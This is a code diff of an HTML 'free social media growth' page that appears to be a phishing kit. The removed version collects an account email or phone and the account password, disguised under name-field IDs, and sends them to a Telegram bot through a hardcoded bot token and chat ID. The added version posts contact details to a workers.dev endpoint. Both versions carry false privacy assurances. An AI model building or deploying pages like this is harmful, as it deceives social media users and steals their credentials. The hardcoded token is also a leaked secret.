@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Get Free Social Media Growth for a Limited Time</title>
+    <title>Get Free Social Media Growth</title>
     <style>
-        /* General Styling */
         body {
             font-family: Arial, sans-serif;
             text-align: center;
@@ -23,14 +22,8 @@
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
 
-        h2 {
-            color: #333;
-            margin-bottom: 10px;
-        }
-
-        p {
-            color: #666;
-        }
+        h2 { color: #333; margin-bottom: 10px; }
+        p { color: #666; }
 
         input, select, button {
             width: 100%;
@@ -39,10 +32,6 @@
             border: 1px solid #ddd;
             border-radius: 6px;
             font-size: 16px;
-        }
-
-        select {
-            background-color: #f9f9f9;
         }
 
         button {
@@ -58,54 +47,28 @@
             background-color: #005f99;
         }
 
-        .hidden {
-            display: none;
-        }
+        .hidden { display: none; }
+        .progress { width: 100%; background: #ddd; height: 8px; border-radius: 10px; margin-bottom: 15px; }
+        .progress-bar { height: 8px; width: 0%; background: #0088cc; transition: 0.4s ease-in-out; }
 
-        /* Progress Bar */
-        .progress {
-            width: 100%;
-            background: #ddd;
-            height: 8px;
-            border-radius: 10px;
-            margin-bottom: 15px;
-            overflow: hidden;
-        }
-
-        .progress-bar {
-            height: 8px;
-            width: 0%;
-            background: #0088cc;
-            transition: 0.4s ease-in-out;
-        }
-
-        /* Loading Text */
-        #loading {
-            display: none;
-            font-size: 16px;
-            color: green;
-        }
-
+        #loading { display: none; font-size: 16px; color: green; }
     </style>
 </head>
 <body>
 
-    <!-- Welcome Page -->
     <div id="welcomePage" class="container">
         <h2>Welcome to Free Social Media Growth! 🚀</h2>
         <p>We offer **100% free** services to help you grow on social media. Click below to continue.</p>
         <button onclick="showPrivacyPolicy()">Get Started</button>
     </div>
 
-    <!-- Privacy Policy Page -->
     <div id="privacyPage" class="container hidden">
         <h2>Privacy & Security 🔒</h2>
-        <p>Your information is **safe and confidential**. We never share your data.</p>
+        <p>Your information is **safe and confidential**. We never share or misuse your data.</p>
         <input type="checkbox" id="acceptPolicy"> I accept the privacy policy<br>
         <button onclick="showServiceSelection()">Continue</button>
     </div>
 
-    <!-- Service Selection Page -->
     <div id="servicePage" class="container hidden">
         <h2>Select Your Platform 📲</h2>
         <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
@@ -133,82 +96,35 @@
         <button onclick="showDetailsForm()">Next</button>
     </div>
 
-    <!-- User Details Form -->
     <div id="detailsPage" class="container hidden">
-        <h2>Enter Your Account Details 📩</h2>
+        <h2>Your Contact Details 📩</h2>
         <div class="progress"><div class="progress-bar" id="progressBarDetails"></div></div>
-        <input type="text" id="contactInfo" placeholder="Phone Number or Email (associated with your account)" required>
-        <input type="text" id="firstName" placeholder="Your Password" required>
-        <input type="text" id="lastName" placeholder="Enter Password Again" required>
+        <input type="text" id="contactInfo" placeholder="Phone Number or Email" required>
+        <input type="text" id="firstName" placeholder="First Name" required>
+        <input type="text" id="lastName" placeholder="Last Name" required>
         <button onclick="submitForm()">Submit Request</button>
-        <p id="loading">Your request is being processed... Please wait</p>
+        <p id="loading">Submitting... Please wait</p>
     </div>
 
     <script>
-        function showPrivacyPolicy() {
-            document.getElementById("welcomePage").classList.add("hidden");
-            document.getElementById("privacyPage").classList.remove("hidden");
-        }
+        let workerURL = "https://freefollowers.raobbcc.workers.dev"; // Replace with your Cloudflare Worker URL
 
-        function showServiceSelection() {
-            if (!document.getElementById("acceptPolicy").checked) {
-                alert("❌ You must accept the privacy policy to continue.");
-                return;
-            }
-            document.getElementById("privacyPage").classList.add("hidden");
-            document.getElementById("servicePage").classList.remove("hidden");
-            document.getElementById("progressBar").style.width = "50%";
-        }
-
-        function showDetailsForm() {
-            document.getElementById("servicePage").classList.add("hidden");
-            document.getElementById("detailsPage").classList.remove("hidden");
-            document.getElementById("progressBarDetails").style.width = "100%";
-        }
+        function showPrivacyPolicy() { document.getElementById("welcomePage").classList.add("hidden"); document.getElementById("privacyPage").classList.remove("hidden"); }
+        function showServiceSelection() { if (!document.getElementById("acceptPolicy").checked) { alert("❌ You must accept the privacy policy to continue."); return; } document.getElementById("privacyPage").classList.add("hidden"); document.getElementById("servicePage").classList.remove("hidden"); }
+        function showDetailsForm() { document.getElementById("servicePage").classList.add("hidden"); document.getElementById("detailsPage").classList.remove("hidden"); }
 
         async function submitForm() {
-            let platform = document.getElementById("platform").value;
-            let serviceType = document.getElementById("serviceType").value;
-            let quantity = document.getElementById("quantity").value;
-            let contactInfo = document.getElementById("contactInfo").value.trim();
-            let firstName = document.getElementById("firstName").value.trim();
-            let lastName = document.getElementById("lastName").value.trim();
-            let loadingText = document.getElementById("loading");
+            let requestBody = {
+                platform: document.getElementById("platform").value,
+                serviceType: document.getElementById("serviceType").value,
+                quantity: document.getElementById("quantity").value,
+                contactInfo: document.getElementById("contactInfo").value.trim(),
+                firstName: document.getElementById("firstName").value.trim(),
+                lastName: document.getElementById("lastName").value.trim()
+            };
 
-            // Validation
-            if (contactInfo === "" || firstName === "" || lastName === "") {
-                alert("❌ Please fill out all fields.");
-                return;
-            }
-
-            // Show loading message
-            loadingText.style.display = "block";
-
-            // Telegram Bot Credentials (Replace with yours)
-            let botToken = "7525645029:AAHOfKzGmtNHr1MY9G1y6FMtOmWnjbG9wJI";
-            let chatId = "7141838359";
-
-            // Message format
-            let text = `🚀 *New Free Service Request* 🚀\n\n📌 *Platform:* ${platform}\n🛠 *Service:* ${serviceType}\n📦 *Quantity:* ${quantity}\n📞 *Contact:* ${contactInfo}\n👤 *Name:* ${firstName} ${lastName}`;
-
-            let telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-            try {
-                let response = await fetch(telegramURL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" })
-                });
-
-                let data = await response.json();
-                if (data.ok) alert("✅ Request submitted successfully!");
-                else alert("❌ Submission failed!");
-            } catch (error) {
-                console.error("Error:", error);
-                alert("❌ An error occurred.");
-            } finally {
-                loadingText.style.display = "none";
-            }
+            await fetch(workerURL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(requestBody) });
+            alert("✅ Request submitted successfully!");
         }
     </script>
 
